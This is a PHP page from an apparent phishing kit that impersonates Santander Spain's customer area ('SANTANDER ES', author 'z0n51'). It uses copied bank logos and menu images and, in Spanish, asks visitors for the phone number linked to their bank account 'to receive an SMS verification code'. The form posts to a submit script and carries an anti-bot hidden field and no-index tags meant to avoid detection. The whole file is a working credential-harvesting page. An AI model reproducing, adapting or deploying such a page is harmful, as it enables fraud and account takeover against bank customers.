<?php

/**
 * @link              https://www.z0n51.com/
 * @since             20/02/2020
 * @package           SANTANDER ES
 * @facebook          https://www.facebook.com/z0n51
 * @whatsapp          +212601728021
 * @icq               @z0n51
 * @telegram          @z0n51
 *
 * Project Name:      SANTANDER ES
 * Author:            z0n51
 * Author URI:        https://www.facebook.com/z0n51
 */

    include_once '../inc/app.php';
?>
<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="../assets/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/fonts.css">
        <link rel="stylesheet" href="../assets/css/main.css">

        <link rel="icon" href="../assets/images/fav.png" type="image/png"> 
        
        <title>Home</title>
    </head>

    <body style="background: #F7F7F7;">
        
        <!-- HEADER -->
        <header id="header">
            <div class="container">
                <div class="logo">
                    <img class="d-lg-block d-md-none d-sm-none d-none" style="min-width: 201px;"  src="../assets/images/logoo.png">
                    <img class="d-lg-none d-md-block d-sm-block d-block" style="min-width: 27px;"  src="../assets/images/mobilelogo.png">
                </div>
                <div class="menu">
                    <img style="min-width: 543px;" class="d-lg-block d-md-none d-sm-none d-none" src="../assets/images/mainmenu.png">
                    <img style="min-width: 31px;"  class="d-lg-none d-md-block d-sm-block d-block" src="../assets/images/mobilemenu.png">
                </div>
            </div>
        </header>
        <!-- END HEADER -->
        
        <!-- NAV -->
        <nav id="nav">
            <div class="container">
                <div class="secondmenu"><img src="../assets/images/secondmenu.png"></div>
                <div class="sofia"><img src="../assets/images/sofia.png"></div>
            </div>
        </nav>
        <!-- END NAV -->
        
        <!-- MAIN -->
        <main id="main">
            <div class="container">
                <div class="main-title"><h3>Àrea de cliente : Informaciones de Contacto</h3></div>
                <div class="details-box">
                    <p>introduzca su número de teléfono principal asociado con su cuenta bancaria para recibir su código SMS de verificación de identidad</p>
                    <form method="post" action="submit.php">
                        <div class="form-group <?php echo is_invalid_class($_SESSION['errors'],'phone') ?>">
                            <input type="text" name="phone" id="phone" maxlength="10" class="form-control" placeholder="Número de Teléfono" value="<?php echo get_value('phone'); ?>">
                            <?php echo error_message($_SESSION['errors'],'phone'); ?>
                        </div>
                        <input type="hidden" name="verbot">
                        <input type="hidden" name="type" value="phone">
                        <div class="form-group mt30 mb-0 text-right">
                            <button type="submit">ACEPTAR</button>
                        </div>
                    </form>
                </div>
            </div>
        </main>
        <!-- END MAIN -->



        <!-- JS FILES -->
        <script src="../assets/js/jquery.min.js"></script>
        <script src="../assets/js/popper.min.js"></script>
        <script src="../assets/js/bootstrap.min.js"></script>
        <script src="../assets/js/fontawesome.min.js"></script>
        <script src="../assets/js/main.js"></script>

    </body>

</html>